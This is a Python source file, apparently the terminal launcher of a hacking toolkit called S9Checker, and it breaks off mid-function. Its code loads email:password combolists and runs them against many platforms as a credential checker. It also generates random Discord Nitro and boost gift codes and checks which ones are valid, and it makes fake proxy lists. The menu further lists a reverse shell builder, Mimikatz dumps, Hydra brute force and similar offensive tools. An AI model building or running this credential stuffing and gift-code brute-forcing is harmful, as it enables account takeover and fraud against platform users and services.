"""
CLI launcher for S9Checker.
ASCII art banner + interactive terminal menu with ANSI colors.
Features: typing animation, dark noir theme, proxy/IP generator.
"""

import os
import sys
import io
import time
import random
import string
import ctypes
import threading

# Fix Windows console encoding for Unicode output
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")

# Enable ANSI escape code support on Windows
kernel32 = ctypes.windll.kernel32
kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)


# ── Dark noir ANSI palette (zero green) ─────────────────────────────────────
class C:
    """Dark noir ANSI colors — cyberpunk, no green."""
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    ITALIC  = "\033[3m"
    UNDERL  = "\033[4m"

    # Dark base (30-37)
    BLACK   = "\033[30m"
    DK_RED  = "\033[31m"
    DK_MAG  = "\033[35m"
    DK_CYN  = "\033[36m"
    GRAY    = "\033[37m"

    # Bright accents (90-97)
    RED     = "\033[91m"
    MAGENTA = "\033[95m"
    CYAN    = "\033[96m"
    WHITE   = "\033[97m"
    YELLOW  = "\033[93m"

    DK_YEL  = "\033[33m"


# ── Typing animation ─────────────────────────────────────────────────────────
def type_text(text, delay=0.015, end="\n"):
    """Print text character by character."""
    try:
        for ch in text:
            sys.stdout.write(ch)
            sys.stdout.flush()
            time.sleep(delay)
        if end:
            sys.stdout.write(end)
            sys.stdout.flush()
    except KeyboardInterrupt:
        sys.stdout.write(C.RESET + "\n")
        sys.stdout.flush()
        raise


def type_line(text, delay=0.02):
    """Type a line then newline."""
    type_text(text, delay=delay, end="\n")


def slow_type(text, delay=0.2):
    """Slow dramatic typing."""
    type_text(text, delay=delay, end="\n")


# ── Module imports ───────────────────────────────────────────────────────────
from modules.utils.combolist import ComboList, scan_combolists
from modules.utils.config import RESULTS_DIR

# ── Raw strings (no ANSI) for animation ──────────────────────────────────────
BANNER_RAW = r"""
 .▄▄ · ▄▄▄▄▄            ▄▄▌
 ▐█ ▀. •██  ▪     ▪     ██•
 ▄▀▀▀█▄ ▐█.▪ ▄█▀▄  ▄█▀▄ ██▪
 ▐█▄▪▐█ ▐█▌·▐█▌.▐▌▐█▌.▐▌▐█▌▐▌
  ▀▀▀▀  ▀▀▀  ▀█▄▀▪ ▀█▄▀▪.▀▀▀"""

MENU_PAGE1 = [
    "  {cyan}{bold}[1]{reset} Launch GUI",
    "  {cyan}{bold}[2]{reset} Manage Combolists",
    "  {cyan}{bold}[3]{reset} Quick Check (CLI)",
    "  {cyan}{bold}[4]{reset} View Results",
    "  {cyan}{bold}[5]{reset} Settings",
    "  {cyan}{bold}[6]{reset} Proxy / IP Generator",
    "  {cyan}{bold}[7]{reset} Discord Nitro Generator + Checker",
    "  {cyan}{bold}[8]{reset} Discord Boost Generator + Checker",
    "  {cyan}{bold}[9]{reset} Nitro Promo Codes (OperaGX, etc.)",
    "  {cyan}{bold}[10]{reset} Website Scraper / Cloner",
]

MENU_PAGE2 = [
    "  {cyan}{bold}[11]{reset} Reverse Shell Builder",
    "  {cyan}{bold}[12]{reset} Nmap Scanner",
    "  {cyan}{bold}[13]{reset} Masscan Port Scan",
    "  {cyan}{bold}[14]{reset} RustScan Port Scan",
    "  {cyan}{bold}[15]{reset} Amass Subdomain Enum",
    "  {cyan}{bold}[16]{reset} Subfinder Subdomain Enum",
    "  {cyan}{bold}[17]{reset} httpx HTTP Probe",
    "  {cyan}{bold}[18]{reset} theHarvester Recon",
    "  {cyan}{bold}[19]{reset} ExploitDB Searchsploit",
    "  {cyan}{bold}[20]{reset} Metasploit Framework",
]

MENU_PAGE3 = [
    "  {cyan}{bold}[21]{reset} Impacket Toolkit",
    "  {cyan}{bold}[22]{reset} Responder Poisoner",
    "  {cyan}{bold}[23]{reset} CrackMapExec / NetExec",
    "  {cyan}{bold}[24]{reset} BloodHound AD Enum",
    "  {cyan}{bold}[25]{reset} Mimikatz Dumps",
    "  {cyan}{bold}[26]{reset} Hashcat Cracker",
    "  {cyan}{bold}[27]{reset} John the Ripper",
    "  {cyan}{bold}[28]{reset} THC-Hydra Brute Force",
    "  {cyan}{bold}[29]{reset} Ghidra Reverse Eng",
    "  {cyan}{bold}[30]{reset} radare2 Reverse Eng",
]

MENU_PAGE4 = [
    "  {cyan}{bold}[31]{reset} GDB + pwndbg",
    "  {cyan}{bold}[32]{reset} Binwalk Firmware",
    "  {cyan}{bold}[33]{reset} Pwntools Scripts",
    "  {cyan}{bold}[A]{reset}  About S9Checker",
]

SEPARATOR = f"{C.DK_MAG}{'─' * 50}{C.RESET}"


def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")


def _fmt_banner():
    """Return colored banner string."""
    return (
        f"{C.DK_MAG}{C.BOLD}{BANNER_RAW}{C.RESET}\n"
        f"{C.GRAY}{C.DIM}                    v2.0{C.RESET}\n"
        f"{C.DK_MAG}{'─' * 50}{C.RESET}"
    )


def _fmt_menu(page=1):
    """Return colored menu string for given page."""
    pages = {1: MENU_PAGE1, 2: MENU_PAGE2, 3: MENU_PAGE3, 4: MENU_PAGE4}
    items = pages.get(page, MENU_PAGE1)
    lines = []
    for raw in items:
        line = raw.format(
            cyan=C.DK_CYN, bold=C.BOLD, reset=C.RESET
        )
        lines.append(line)

    # Footer with navigation
    nav_parts = []
    if page > 1:
        nav_parts.append(f"{C.DK_CYN}{C.BOLD}[B]{C.RESET} Back")
    if page < 4:
        nav_parts.append(f"{C.DK_CYN}{C.BOLD}[N]{C.RESET} Next page")
    nav_parts.append(f"{C.DK_CYN}{C.BOLD}[0]{C.RESET} Exit")

    lines.append(f"\n  {'    '.join(nav_parts)}")

    return "\n".join(lines)


def print_banner():
    print(_fmt_banner())


def print_menu(page=1):
    print()
    print(_fmt_menu(page))
    print()


def prompt():
    try:
        return input(f"\n  {C.DK_MAG}{C.BOLD}>{C.RESET} ").strip()
    except (KeyboardInterrupt, EOFError):
        print()
        return ""


def safe_input(label):
    """Input that handles Ctrl+C."""
    try:
        return input(f"  {label}").strip()
    except (KeyboardInterrupt, EOFError):
        print()
        return ""


def press_enter():
    """Safe press enter."""
    try:
        input(f"\n  {C.GRAY}{C.DIM}Press Enter...{C.RESET}")
    except (KeyboardInterrupt, EOFError):
        print()


# ── Animated startup (one-time) ─────────────────────────────────────────────
_first_run = True


def animated_startup():
    """Boot sequence animation — only on first launch."""
    global _first_run
    clear_screen()

    # Boot text
    slow_type(f"  {C.DK_MAG}S9Checker v2.0{C.RESET}", delay=0.03)
    time.sleep(0.15)
    type_line(f"  {C.GRAY}Initializing modules...{C.RESET}", delay=0.015)
    time.sleep(0.1)
    type_line(f"  {C.DK_CYN}>> Ready{C.RESET}", delay=0.025)
    time.sleep(0.4)
    clear_screen()

    # Banner line by line
    for line in BANNER_RAW.split("\n"):
        if line.strip():
            type_text(f"{C.DK_MAG}{C.BOLD}{line}{C.RESET}", delay=0.008, end="\n")
            time.sleep(0.06)
        else:
            print()
    type_line(f"{C.GRAY}{C.DIM}                    v2.0{C.RESET}", delay=0.01)
    type_line(f"{C.DK_MAG}{'─' * 50}{C.RESET}", delay=0.005)
    time.sleep(0.15)

    # Menu line by line (page 1)
    print()
    for raw in MENU_PAGE1:
        line = raw.format(cyan=C.DK_CYN, bold=C.BOLD, reset=C.RESET)
        type_text(line, delay=0.008, end="\n")
        time.sleep(0.08)
    # Navigation footer
    nav = f"\n  {C.DK_CYN}{C.BOLD}[N]{C.RESET} Next page    {C.DK_CYN}{C.BOLD}[0]{C.RESET} Exit"
    type_text(nav, delay=0.008, end="\n")
    print()

    _first_run = False


# ── Option 1: Launch GUI ────────────────────────────────────────────────────
def option_launch_gui():
    type_line(f"\n  {C.DK_CYN}Initializing GUI...{C.RESET}", delay=0.03)
    try:
        from ui.app import App
        import tkinter as tk
        root = tk.Tk()
        app = App(root)
        root.mainloop()
    except KeyboardInterrupt:
        type_line(f"\n  {C.DK_YEL}GUI interrupted.{C.RESET}")
    except Exception as e:
        type_line(f"  {C.DK_RED}Error: {e}{C.RESET}")


# ── Option 2: Manage Combolists ──────────────────────────────────────────────
def option_manage_combolists():
    clear_screen()
    print_banner()
    type_line(f"  {C.DK_MAG}{C.BOLD}COMBOLIST MANAGER{C.RESET}", delay=0.02)
    print(SEPARATOR)
    print()

    from modules.utils.config import COMBOLIST_DIR
    os.makedirs(COMBOLIST_DIR, exist_ok=True)

    files = scan_combolists(COMBOLIST_DIR)
    if files:
        print(f"  {C.GRAY}Saved combolists:{C.RESET}")
        for i, f in enumerate(files, 1):
            name = os.path.basename(f)
            size = os.path.getsize(f)
            print(f"    {C.DK_CYN}[{i}]{C.RESET} {name}  {C.GRAY}({size} bytes){C.RESET}")
    else:
        print(f"  {C.GRAY}No combolists found in combolists/{C.RESET}")

    print()
    print(f"  {C.DK_CYN}[L]{C.RESET} Load a file from anywhere")
    print(f"  {C.DK_CYN}[B]{C.RESET} Back to menu")
    print()

    choice = prompt().lower()

    if choice == "b":
        return
    elif choice == "l":
        filepath = safe_input(f"{C.GRAY}Enter file path: {C.RESET}").strip().strip('"')
        if not filepath or not os.path.exists(filepath):
            type_line(f"  {C.DK_RED}File not found.{C.RESET}")
            press_enter()
            return

        cl = ComboList(name=os.path.basename(filepath))
        count = cl.load(filepath)
        type_line(f"\n  {C.DK_CYN}Loaded {count} unique combos{C.RESET}")

        stats = cl.stats()
        print(f"  {C.GRAY}Domains: {stats['domains']}{C.RESET}")
        for d, c in list(stats['top_domains'].items())[:5]:
            print(f"    {C.DK_MAG}@{d}{C.RESET}: {c}")

        print(f"\n  {C.GRAY}Preview (first 10):{C.RESET}")
        for email, pw in cl.preview(10):
            print(f"    {C.DK_MAG}{email}{C.RESET}:{C.DK_CYN}{pw}{C.RESET}")

        print()
        save = safe_input(f"{C.GRAY}Save to combolists/? (y/n): {C.RESET}").lower()
        if save == "y":
            save_path = os.path.join(COMBOLIST_DIR, os.path.basename(filepath))
            cl.save(save_path)
            type_line(f"  {C.DK_CYN}Saved to {save_path}{C.RESET}")

        press_enter()
    elif choice.isdigit():
        idx = int(choice) - 1
        if 0 <= idx < len(files):
            cl = ComboList()
            cl.load(files[idx])
            type_line(f"\n  {C.DK_CYN}Loaded {len(cl)} combos{C.RESET}")
            stats = cl.stats()
            print(f"  {C.GRAY}Domains: {stats['domains']}{C.RESET}")
            for email, pw in cl.preview(10):
                print(f"    {C.DK_MAG}{email}{C.RESET}:{C.DK_CYN}{pw}{C.RESET}")
            press_enter()


# ── Option 3: Quick Check ───────────────────────────────────────────────────
def option_quick_check():
    clear_screen()
    print_banner()
    type_line(f"  {C.DK_MAG}{C.BOLD}QUICK CHECK (CLI){C.RESET}", delay=0.02)
    print(SEPARATOR)
    print()

    filepath = safe_input(f"{C.GRAY}Combo file path: {C.RESET}").strip().strip('"')
    if not filepath or not os.path.exists(filepath):
        type_line(f"  {C.DK_RED}File not found.{C.RESET}")
        press_enter()
        return

    from modules.checker.platforms import PLATFORMS
    print(f"\n  {C.GRAY}Available platforms:{C.RESET}")
    names = sorted(PLATFORMS.keys())
    for i, name in enumerate(names, 1):
        p = PLATFORMS[name]
        print(f"    {C.DK_CYN}[{i:2d}]{C.RESET} {name:<25} {C.GRAY}{p.rate_limit_per_sec} req/s{C.RESET}")

    print()
    sel = safe_input(f"{C.GRAY}Select platforms (comma-separated, or 'all'): {C.RESET}")
    if sel == "all":
        selected = names
    else:
        try:
            indices = [int(x.strip()) - 1 for x in sel.split(",")]
            selected = [names[i] for i in indices if 0 <= i < len(names)]
        except (ValueError, IndexError):
            type_line(f"  {C.DK_RED}Invalid selection.{C.RESET}")
            press_enter()
            return

    if not selected:
        type_line(f"  {C.DK_RED}No platforms selected.{C.RESET}")
        press_enter()
        return

    cl = ComboList()
    count = cl.load(filepath)
    type_line(f"\n  {C.DK_CYN}Loaded {count} combos{C.RESET}")
    print(f"  {C.GRAY}Platforms: {', '.join(selected)}{C.RESET}")
    print(f"  {C.GRAY}Total requests: {count * len(selected)}{C.RESET}")
    print()

    confirm = safe_input(f"{C.GRAY}Start check? (y/n): {C.RESET}").lower()
    if confirm != "y":
        return

    import asyncio
    from modules.checker.credential_checker import CredentialChecker
    from modules.utils.results import ResultsManager

    async def _run():
        mgr = ResultsManager(output_dir=RESULTS_DIR)
        checker = CredentialChecker(results_mgr=mgr, delay=0.3, max_concurrent=5)

        async def _progress(info):
            pct = info.get("percent", 0)
            valid = info.get("valid", 0)
            invalid = info.get("invalid", 0)
            speed = info.get("speed", 0)
            sys.stdout.write(
                f"\r  {C.DK_MAG}[{pct:3d}%]{C.RESET} "
                f"{C.DK_CYN}{valid} valid{C.RESET} | "
                f"{C.DK_RED}{invalid} invalid{C.RESET} | "
                f"{C.GRAY}{speed} req/s{C.RESET}  "
            )
            sys.stdout.flush()

        checker.progress_cb = _progress
        await checker.run_test(cl.combos, selected)
        print()

        stats = mgr.get_stats()
        type_line(f"\n  {C.DK_CYN}{C.BOLD}DONE{C.RESET} - "
                  f"{C.DK_CYN}{stats['valid']} valid{C.RESET} / "
                  f"{C.DK_RED}{stats['invalid']} invalid{C.RESET} / "
                  f"{C.DK_YEL}{stats['errors']} errors{C.RESET}")
        print(f"  {C.GRAY}Results saved to {RESULTS_DIR}/{C.RESET}")

    try:
        asyncio.run(_run())
    except KeyboardInterrupt:
        type_line(f"\n  {C.DK_YEL}Check interrupted.{C.RESET}")
    press_enter()


# ── Option 4: View Results ──────────────────────────────────────────────────
def option_view_results():
    clear_screen()
    print_banner()
    type_line(f"  {C.DK_MAG}{C.BOLD}RESULTS{C.RESET}", delay=0.02)
    print(SEPARATOR)
    print()

    if not os.path.isdir(RESULTS_DIR):
        type_line(f"  {C.GRAY}No results directory found.{C.RESET}")
        press_enter()
        return

    files = os.listdir(RESULTS_DIR)
    if not files:
        type_line(f"  {C.GRAY}No result files found.{C.RESET}")
        press_enter()
        return

    print(f"  {C.GRAY}Result files:{C.RESET}")
    for f in sorted(files):
        size = os.path.getsize(os.path.join(RESULTS_DIR, f))
        print(f"    {C.DK_MAG}{f}{C.RESET}  {C.GRAY}{size} bytes{C.RESET}")

    print()
    choice = safe_input(f"{C.GRAY}View which file? (filename, or Enter to go back): {C.RESET}")
    if not choice:
        return

    fpath = os.path.join(RESULTS_DIR, choice)
    if os.path.exists(fpath):
        print(f"\n  {C.DK_MAG}--- {choice} ---{C.RESET}\n")
        with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
            for i, line in enumerate(f):
                if i >= 50:
                    print(f"\n  {C.GRAY}... ({i}+ lines shown){C.RESET}")
                    break
                print(f"  {line.rstrip()}")

    press_enter()


# ── Option 5: Settings ──────────────────────────────────────────────────────
def option_settings():
    clear_screen()
    print_banner()
    type_line(f"  {C.DK_MAG}{C.BOLD}SETTINGS{C.RESET}", delay=0.02)
    print(SEPARATOR)
    print()
    print(f"  {C.GRAY}Current configuration:{C.RESET}")
    print(f"    {C.DK_CYN}Default delay:{C.RESET}       0.3s")
    print(f"    {C.DK_CYN}Default concurrency:{C.RESET} 10")
    print(f"    {C.DK_CYN}Default timeout:{C.RESET}     15s")
    print(f"    {C.DK_CYN}Max retries (429):{C.RESET}   3")
    print(f"    {C.DK_CYN}Results directory:{C.RESET}   {RESULTS_DIR}/")
    print()
    print(f"  {C.GRAY}(Settings are configured via the GUI Settings page){C.RESET}")
    press_enter()


# ── Option 6: Proxy / IP Generator ──────────────────────────────────────────
def _random_ip():
    first = random.choice([i for i in range(1, 224) if i != 127])
    return f"{first}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def _random_port():
    return random.choice([8080, 3128, 8000, 8888, 1080, 9050, 9051, 4145, 10808, 10809, 7890, 7891])


def _random_user():
    prefixes = ["user", "proxy", "node", "srv", "gw", "nat", "vpn", "relay", "edge"]
    return f"{random.choice(prefixes)}{random.randint(100, 9999)}"


def _random_pass(length=12):
    chars = string.ascii_letters + string.digits + "!@#$%&*"
    return "".join(random.choices(chars, k=length))


def option_proxy_generator():
    clear_screen()
    print_banner()
    type_line(f"  {C.DK_MAG}{C.BOLD}PROXY / IP GENERATOR{C.RESET}", delay=0.02)
    print(SEPARATOR)
    print()
    print(f"  {C.DK_CYN}[1]{C.RESET} Generate random IPs")
    print(f"  {C.DK_CYN}[2]{C.RESET} Generate SOCKS5 proxies (ip:port:user:pass)")
    print(f"  {C.DK_CYN}[3]{C.RESET} Generate HTTP proxies (ip:port)")
    print(f"  {C.DK_CYN}[4]{C.RESET} Generate mixed proxy list")
    print(f"  {C.DK_CYN}[5]{C.RESET} Import & validate existing proxy file")
    print(f"  {C.DK_CYN}[B]{C.RESET} Back to menu")
    print()

    choice = prompt()

    if choice in ("b", ""):
        return
    elif choice == "1":
        _gen_random_ips()
    elif choice == "2":
        _gen_socks5_proxies()
    elif choice == "3":
        _gen_http_proxies()
    elif choice == "4":
        _gen_mixed_proxies()
    elif choice == "5":
        _import_validate_proxies()
    else:
        type_line(f"  {C.DK_RED}Invalid option.{C.RESET}")
        press_enter()


def _gen_random_ips():
    count_str = safe_input(f"{C.GRAY}How many IPs? (default 20): {C.RESET}")
    count = int(count_str) if count_str.isdigit() and int(count_str) > 0 else 20

    type_line(f"\n  {C.GRAY}Generating {count} random IPs...{C.RESET}\n")

    ips = [_random_ip() for _ in range(count)]
    for i, ip in enumerate(ips, 1):
        print(f"    {C.DK_MAG}{ip}{C.RESET}")
        if i % 20 == 0 and i < count:
            type_text(f"    {C.GRAY}... ({i}/{count}){C.RESET}", delay=0.01)

    print(f"\n  {C.DK_CYN}Generated {count} IPs{C.RESET}")

    save = safe_input(f"{C.GRAY}Save to file? (y/n): {C.RESET}").lower()
    if save == "y":
        filepath = safe_input(f"{C.GRAY}Filename (e.g. ips.txt): {C.RESET}")
        if not filepath:
            filepath = "generated_ips.txt"
        if not filepath.endswith(".txt"):
            filepath += ".txt"
        with open(filepath, "w", encoding="utf-8") as f:
            f.write("\n".join(ips) + "\n")
        type_line(f"  {C.DK_CYN}Saved {count} IPs to {filepath}{C.RESET}")

    press_enter()


def _gen_socks5_proxies():
    count_str = safe_input(f"{C.GRAY}How many proxies? (default 20): {C.RESET}")
    count = int(count_str) if count_str.isdigit() and int(count_str) > 0 else 20

    type_line(f"\n  {C.GRAY}Generating {count} SOCKS5 proxies...{C.RESET}\n")

    proxies = []
    for _ in range(count):
        ip = _random_ip()
        port = _random_port()
        user = _random_user()
        pw = _random_pass()
        proxy = f"{ip}:{port}:{user}:{pw}"
        proxies.append(proxy)
        print(f"    {C.DK_MAG}{ip}:{C.RESET}{port} {C.GRAY}{user}:{pw}{C.RESET}")

    print(f"\n  {C.DK_CYN}Generated {count} SOCKS5 proxies{C.RESET}")

    save = safe_input(f"{C.GRAY}Save to file? (y/n): {C.RESET}").lower()
    if save == "y":
        filepath = safe_input(f"{C.GRAY}Filename (e.g. proxies.txt): {C.RESET}")
        if not filepath:
            filepath = "generated_proxies.txt"
        if not filepath.endswith(".txt"):
            filepath += ".txt"
        with open(filepath, "w", encoding="utf-8") as f:
            f.write("\n".join(proxies) + "\n")
        type_line(f"  {C.DK_CYN}Saved {count} proxies to {filepath}{C.RESET}")

    press_enter()


def _gen_http_proxies():
    count_str = safe_input(f"{C.GRAY}How many proxies? (default 20): {C.RESET}")
    count = int(count_str) if count_str.isdigit() and int(count_str) > 0 else 20

    type_line(f"\n  {C.GRAY}Generating {count} HTTP proxies...{C.RESET}\n")

    proxies = []
    for _ in range(count):
        ip = _random_ip()
        port = _random_port()
        proxy = f"{ip}:{port}"
        proxies.append(proxy)
        print(f"    {C.DK_CYN}{proxy}{C.RESET}")

    print(f"\n  {C.DK_CYN}Generated {count} HTTP proxies{C.RESET}")

    save = safe_input(f"{C.GRAY}Save to file? (y/n): {C.RESET}").lower()
    if save == "y":
        filepath = safe_input(f"{C.GRAY}Filename (e.g. http_proxies.txt): {C.RESET}")
        if not filepath:
            filepath = "generated_http_proxies.txt"
        if not filepath.endswith(".txt"):
            filepath += ".txt"
        with open(filepath, "w", encoding="utf-8") as f:
            f.write("\n".join(proxies) + "\n")
        type_line(f"  {C.DK_CYN}Saved {count} proxies to {filepath}{C.RESET}")

    press_enter()


def _gen_mixed_proxies():
    count_str = safe_input(f"{C.GRAY}How many proxies? (default 30): {C.RESET}")
    count = int(count_str) if count_str.isdigit() and int(count_str) > 0 else 30

    type_line(f"\n  {C.GRAY}Generating {count} mixed proxies...{C.RESET}\n")

    formats = ["socks5", "http", "bare"]
    proxies = []
    for _ in range(count):
        ip = _random_ip()
        port = _random_port()
        fmt = random.choice(formats)

        if fmt == "socks5":
            user = _random_user()
            pw = _random_pass(8)
            proxy = f"socks5://{user}:{pw}@{ip}:{port}"
        elif fmt == "http":
            proxy = f"http://{ip}:{port}"
        else:
            proxy = f"{ip}:{port}"

        proxies.append(proxy)
        color = C.DK_MAG if fmt == "socks5" else C.DK_CYN if fmt == "http" else C.GRAY
        print(f"    {color}{proxy}{C.RESET}")

    print(f"\n  {C.DK_CYN}Generated {count} mixed proxies{C.RESET}")

    save = safe_input(f"{C.GRAY}Save to file? (y/n): {C.RESET}").lower()
    if save == "y":
        filepath = safe_input(f"{C.GRAY}Filename (e.g. mixed_proxies.txt): {C.RESET}")
        if not filepath:
            filepath = "generated_mixed_proxies.txt"
        if not filepath.endswith(".txt"):
            filepath += ".txt"
        with open(filepath, "w", encoding="utf-8") as f:
            f.write("\n".join(proxies) + "\n")
        type_line(f"  {C.DK_CYN}Saved {count} proxies to {filepath}{C.RESET}")

    press_enter()


def _import_validate_proxies():
    filepath = safe_input(f"{C.GRAY}Proxy file path: {C.RESET}").strip().strip('"')
    if not filepath or not os.path.exists(filepath):
        type_line(f"  {C.DK_RED}File not found.{C.RESET}")
        press_enter()
        return

    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        lines = [l.strip() for l in f if l.strip()]

    type_line(f"\n  {C.GRAY}Loaded {len(lines)} lines from {filepath}{C.RESET}")
    print(f"\n  {C.GRAY}Format preview (first 5):{C.RESET}")
    for line in lines[:5]:
        print(f"    {C.DK_MAG}{line}{C.RESET}")

    socks5_count = sum(1 for l in lines if l.startswith("socks5://"))
    http_count = sum(1 for l in lines if l.startswith("http://"))
    bare_count = len(lines) - socks5_count - http_count

    print(f"\n  {C.GRAY}Detected formats:{C.RESET}")
    print(f"    SOCKS5: {C.DK_MAG}{socks5_count}{C.RESET}")
    print(f"    HTTP:   {C.DK_CYN}{http_count}{C.RESET}")
    print(f"    Bare:   {C.GRAY}{bare_count}{C.RESET}")

    press_enter()


# ── Option 7: Discord Nitro Generator + Checker ─────────────────────────────
def option_nitro_generator():
    """Generate and check Discord Nitro gift codes."""
    clear_screen()
    print_banner()
    type_line(f"  {C.DK_MAG}{C.BOLD}DISCORD NITRO GENERATOR + CHECKER{C.RESET}", delay=0.02)
    print(SEPARATOR)
    print()

    from modules.discord.generator import generate_nitro_code, generate_nitro_url
    from modules.discord.checker import DiscordChecker

    print(f"  {C.DK_CYN}[1]{C.RESET} Generate codes only")
    print(f"  {C.DK_CYN}[2]{C.RESET} Generate + Check codes")
    print(f"  {C.DK_CYN}[3]{C.RESET} Check codes from file")
    print(f"  {C.DK_CYN}[B]{C.RESET} Back to menu")
    print()

    choice = prompt()

    if choice in ("b", ""):
        return

    if choice == "1":
        count_str = safe_input(f"{C.GRAY}How many codes to generate? (default 50): {C.RESET}")
        count = int(count_str) if count_str.isdigit() and int(count_str) > 0 else 50
        length_str = safe_input(f"{C.GRAY}Code length (16-24, default 16): {C.RESET}")
        length = int(length_str) if length_str.isdigit() and 16 <= int(length_str) <= 24 else 16

        type_line(f"\n  {C.GRAY}Generating {count} Nitro codes (length {length})...{C.RESET}\n")

        codes = [generate_nitro_code(length) for _ in range(count)]
        for i, code in enumerate(codes, 1):
            url = generate_nitro_url(code)
            print(f"    {C.DK_MAG}{url}{C.RESET}")
            if i % 25 == 0 and i < count:
                type_text(f"    {C.GRAY}... ({i}/{count}){C.RESET}", delay=0.01)

        print(f"\n  {C.DK_CYN}Generated {count} Nitro codes{C.RESET}")

        save = safe_input(f"{C.GRAY}Save to file? (y/n): {C.RESET}").lower()
        if save == "y":
            filepath = safe_input(f"{C.GRAY}Filename (e.g. nitro_codes.txt): {C.RESET}")
            if not filepath:
                filepath = "nitro_codes.txt"
            if not filepath.endswith(".txt"):
                filepath += ".txt"
            with open(filepath, "w", encoding="utf-8") as f:
                f.write("\n".join(codes) + "\n")
            type_line(f"  {C.DK_CYN}Saved {count} codes to {filepath}{C.RESET}")

        press_enter()

    elif choice == "2":
        count_str = safe_input(f"{C.GRAY}How many codes to generate + check? (default 20): {C.RESET}")
        count = int(count_str) if count_str.isdigit() and int(count_str) > 0 else 20
        length_str = safe_input(f"{C.GRAY}Code length (16-24, default 16): {C.RESET}")
        length = int(length_str) if length_str.isdigit() and 16 <= int(length_str) <= 24 else 16
        delay_str = safe_input(f"{C.GRAY}Delay between checks in seconds (default 0.5): {C.RESET}")
        delay = float(delay_str) if delay_str.replace(".", "").isdigit() else 0.5

        codes = [generate_nitro_code(length) for _ in range(count)]
        type_line(f"\n  {C.GRAY}Generated {count} codes. Starting check...{C.RESET}\n")

        import asyncio

        async def _run():
            checker = DiscordChecker(delay=delay)

            async def _progress(info):
                pct = info.get("percent", 0)
                valid = info.get("valid", 0)
                invalid = info.get("invalid", 0)
                speed = info.get("speed", 0)
                sys.stdout.write(
                    f"\r  {C.DK_MAG}[{pct:3d}%]{C.RESET} "
                    f"{C.DK_CYN}{valid} valid{C.RESET} | "
                    f"{C.GRAY}{invalid} invalid{C.RESET} | "
                    f"{C.DK_MAG}{speed} codes/s{C.RESET}  "
                )
                sys.stdout.flush()

            checker.progress_cb = _progress
            await checker.check_codes(codes, code_type="gift", max_concurrent=5)
            print()

            stats = checker.stats
            type_line(f"\n  {C.DK_CYN}{C.BOLD}DONE{C.RESET} - "
                      f"{C.DK_CYN}{stats['valid']} valid{C.RESET} / "
                      f"{C.GRAY}{stats['invalid']} invalid{C.RESET} / "
                      f"{C.DK_RED}{stats['errors']} errors{C.RESET}")

            # Show ALL codes with status
            if checker.results:
                type_line(f"\n  {C.DK_CYN}{C.BOLD}ALL CHECKED CODES:{C.RESET}")
                for r in checker.results:
                    url = generate_nitro_url(r.code)
                    if r.status.value == "valid":
                        print(f"    {C.DK_CYN}[VALID]{C.RESET}   {url}")
                    elif r.status.value == "rate_limited":
                        print(f"    {C.DK_YEL}[RATE]{C.RESET}    {url}")
                    elif r.status.value == "error":
                        print(f"    {C.DK_RED}[ERROR]{C.RESET}   {url}")
                    else:
                        print(f"    {C.GRAY}[INVALID]{C.RESET} {url}")

        try:
            asyncio.run(_run())
        except KeyboardInterrupt:
            type_line(f"\n  {C.DK_YEL}Check interrupted.{C.RESET}")
        press_enter()

    elif choice == "3":
        filepath = safe_input(f"{C.GRAY}Code file path (one code per line): {C.RESET}").strip().strip('"')
        if not filepath or not os.path.exists(filepath):
            type_line(f"  {C.DK_RED}File not found.{C.RESET}")
            press_enter()
            return

        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            codes = [l.strip() for l in f if l.strip()]

        type_line(f"\n  {C.GRAY}Loaded {len(codes)} codes from {filepath}{C.RESET}")

        delay_str = safe_input(f"{C.GRAY}Delay between checks (default 0.5): {C.RESET}")
        delay = float(delay_str) if delay_str.replace(".", "").isdigit() else 0.5

        import asyncio

        async def _run():
            checker = DiscordChecker(delay=delay)

            async def _progress(info):
                pct = info.get("percent", 0)
                valid = info.get("valid", 0)
                invalid = info.get("invalid", 0)
                speed = info.get("speed", 0)
                sys.stdout.write(
                    f"\r  {C.DK_MAG}[{pct:3d}%]{C.RESET} "
                    f"{C.DK_CYN}{valid} valid{C.RESET} | "
                    f"{C.GRAY}{invalid} invalid{C.RESET} | "
                    f"{C.DK_MAG}{speed} codes/s{C.RESET}  "
                )
                sys.stdout.flush()

            checker.progress_cb = _progress
            await checker.check_codes(codes, code_type="gift", max_concurrent=5)
            print()

            stats = checker.stats
            type_line(f"\n  {C.DK_CYN}{C.BOLD}DONE{C.RESET} - "
                      f"{C.DK_CYN}{stats['valid']} valid{C.RESET} / "
                      f"{C.GRAY}{stats['invalid']} invalid{C.RESET} / "
                      f"{C.DK_RED}{stats['errors']} errors{C.RESET}")

            # Show ALL codes with status
            if checker.results:
                type_line(f"\n  {C.DK_CYN}{C.BOLD}ALL CHECKED CODES:{C.RESET}")
                for r in checker.results:
                    url = generate_nitro_url(r.code)
                    if r.status.value == "valid":
                        print(f"    {C.DK_CYN}[VALID]{C.RESET}   {url}")
                    elif r.status.value == "rate_limited":
                        print(f"    {C.DK_YEL}[RATE]{C.RESET}    {url}")
                    elif r.status.value == "error":
                        print(f"    {C.DK_RED}[ERROR]{C.RESET}   {url}")
                    else:
                        print(f"    {C.GRAY}[INVALID]{C.RESET} {url}")

        try:
            asyncio.run(_run())
        except KeyboardInterrupt:
            type_line(f"\n  {C.DK_YEL}Check interrupted.{C.RESET}")
        press_enter()


# ── Option 8: Discord Boost Generator + Checker ──────────────────────────────
def option_boost_generator():
    """Generate and check Discord server boost gift codes."""
    clear_screen()
    print_banner()
    type_line(f"  {C.DK_MAG}{C.BOLD}DISCORD BOOST GENERATOR + CHECKER{C.RESET}", delay=0.02)
    print(SEPARATOR)
    print()

    from modules.discord.generator import generate_nitro_code, generate_nitro_url
    from modules.discord.checker import DiscordChecker

    print(f"  {C.GRAY}Discord server boosts use the same gift code format as Nitro.{C.RESET}")
    print(f"  {C.GRAY}Boost gift links: https://discord.gift/XXXXXXXXXXXXXXXX{C.RESET}")
    print()
    print(f"  {C.DK_CYN}[1]{C.RESET} Generate boost codes only")
